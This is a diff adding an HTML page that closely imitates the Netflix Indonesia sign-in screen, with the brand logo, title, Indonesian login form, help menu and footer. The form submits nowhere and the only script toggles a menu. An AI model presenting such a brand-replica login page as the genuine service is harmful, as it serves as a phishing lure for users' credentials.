@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix Indonesia - Tonton Acara TV Online, Tonton Film Online</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <div class="atas">
+        
+        <header class="kepala">
+            <a href="#" class="logo" aria-label="Netflix">
+                <svg viewBox="0 0 111 30" width="148" height="40" fill="#E50914">
+                    <path d="M105.062 14.28L111 30c-1.75-.25-3.499-.563-5.28-.845l-3.345-8.686-3.437 7.969c-1.687-.282-3.344-.376-5.031-.595l6.031-13.75L94.468 0h5.063l3.062 7.874L105.875 0h5.124l-5.937 14.28zM90.47 0h-4.594v27.25c1.5.094 3.062.156 4.594.343V0zm-8.563 26.937c-4.187-.281-8.375-.53-12.656-.625V0h4.687v21.875c2.688.062 5.375.28 7.969.405v4.657zM64.25 10.657v4.687h-6.406V26H53.22V0h13.125v4.687h-8.5v5.97h6.406zm-18.906-5.97V26.25c-1.563 0-3.156 0-4.688.062V4.687h-4.844V0h14.406v4.687h-4.874zM30.75 15.593c-2.062 0-4.5 0-6.25.095v6.968c2.75-.188 5.5-.406 8.281-.5v4.5l-12.968 1.032V0H32.78v4.687H24.5V11c1.813 0 4.594-.094 6.25-.094v4.688zM4.78 12.968v16.375C3.094 29.531 1.593 29.75 0 30V0h4.469l6.093 17.032V0h4.688v28.062c-1.656.282-3.344.376-5.125.625L4.78 12.968z"/>
+                </svg>
+            </a>
+        </header>
+
+        <main class="utama">
+            <div class="kotak">
+                <h1>Masukkan infomu untuk masuk</h1>
+                <p class="subteks">Atau, mulai dengan akun baru.</p>
+                
+                <form>
+                    <div class="grup">
+                        <input type="text" required placeholder=" ">
+                        <label>Email atau nomor ponsel</label>
+                    </div>
+
+                    <button type="submit" class="tombol">Lanjutkan</button>
+                </form>
+
+                <div class="opsi">
+                    <button type="button" class="tbantuan" onclick="bantu()">
+                        Dapatkah Bantuan <span id="panah">⌄</span>
+                    </button>
+                    
+                    <div id="menubantuan" class="menubantuan tersembunyi">
+                        <a href="#">Lupa email atau nomor ponsel?</a>
+                        <a href="#">Pelajari selengkapnya tentang masuk</a>
+                    </div>
+                </div>
+
+                <p class="captcha">
+                    Halaman ini dilindungi oleh reCAPTCHA Google untuk memastikan kamu bukan bot. <a href="#">Pelajari selengkapnya.</a>
+                </p>
+            </div>
+        </main>
+
+    </div>
+
+    <footer class="kaki">
+        <div class="isifooter">
+            <p class="tanya">Ada pertanyaan? Hubungi 007-803-321-8275 (Bebas Pulsa)</p>
+            
+            <ul class="tautan">
+                <li><a href="#">Tanya Jawab</a></li>
+                <li><a href="#">Pusat Bantuan</a></li>
+                <li><a href="#">Ketentuan Penggunaan</a></li>
+                <li><a href="#">Privasi</a></li>
+                <li><a href="#">Preferensi Cookie</a></li>
+                <li><a href="#">Informasi Perusahaan</a></li>
+            </ul>
+
+            <div class="bahasa">
+                <select aria-label="Pilih Bahasa">
+                    <option value="id" selected>🌐 Bahasa Indonesia</option>
+                    <option value="en">🌐 English</option>
+                </select>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        function bantu() {
+            const m = document.getElementById('menubantuan');
+            const p = document.getElementById('panah');
+            if (m.classList.contains('tersembunyi')) {
+                m.classList.remove('tersembunyi');
+                p.textContent = '⌃';
+            } else {
+                m.classList.add('tersembunyi');
+                p.textContent = '⌄';
+            }
+        }
+    </script>
+</body>
+</html>
